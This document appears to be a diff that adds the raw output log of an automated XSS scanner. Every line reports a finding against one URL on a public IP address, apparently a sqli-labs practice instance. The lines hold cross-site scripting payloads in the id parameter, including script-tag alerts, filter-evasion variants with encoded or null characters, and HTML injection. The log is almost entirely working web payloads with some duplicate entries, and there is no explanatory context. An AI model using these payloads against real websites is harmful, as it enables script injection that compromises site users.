@@ -1,0 +1,18 @@
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x3Cscript>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x00script>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x3Cscript>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x00script>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x3Cscript>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x00script>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x3Cscript>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='`"><\x00script>javascript:alert(1)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='); alert('XSS
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='">><script>alert('XSS')</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='">><marquee><h1>XSS</h1></marquee>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='"></title><script>alert(1111)</script>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id='); alert('xss'); var x='
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id=</body>
+[*] XSS Found: http://47.94.106.197:1024/sqlilabs/Less-1/?id=</html>
